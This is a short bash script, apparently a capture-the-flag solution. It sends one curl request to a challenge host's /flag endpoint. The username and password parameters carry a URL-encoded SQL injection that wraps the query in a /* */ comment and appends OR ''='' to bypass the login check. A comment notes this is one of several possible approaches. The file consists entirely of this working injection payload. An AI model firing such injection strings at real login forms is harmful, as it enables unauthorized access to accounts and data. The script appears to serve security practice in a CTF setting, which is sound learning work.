#!/bin/bash

# One option: use /* */ comment. I'm sure there are other solutions.
curl 'http://rmrfslash.xyz:8007/flag?username=blah%27%20/*&password=*/%20OR%20%27%27=%27&submit=Submit'
